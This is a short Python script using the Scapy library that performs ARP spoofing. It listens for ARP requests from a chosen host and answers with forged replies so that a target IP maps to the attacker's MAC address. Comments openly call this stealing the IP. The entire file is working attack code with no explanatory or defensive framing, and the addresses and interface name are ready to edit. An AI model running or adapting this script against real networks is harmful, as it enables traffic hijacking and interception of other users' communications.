#!/usr/bin/env scapy
from scapy.all import *

my_mac = "a0:36:9f:28:15:7c" #mac of the attacker
spoofed_ip = "10.1.0.2"      #IP we would like to steal
source_ip = "10.100.0.1"     #IP from which the request came from
source_mac = "a0:36:9f:28:15:34" #MAC from which the request came from

arp = ARP(op=2,pdst=source_ip, psrc=spoofed_ip, hwsrc=my_mac, hwdst=source_mac)
eth = Ether(src=my_mac, dst=source_mac)
response = eth/arp

def handle_arp(pkt):
    if pkt[ARP].op==1 and pkt[ARP].psrc == source_ip:
        sendp(response, iface="enp1s0f0")
        return f"Received ARP request from {pkt[ARP].psrc} for  {pkt[ARP].pdst}, replied with {my_mac}"


sniff(filter="arp", prn=handle_arp, iface="enp1s0f0")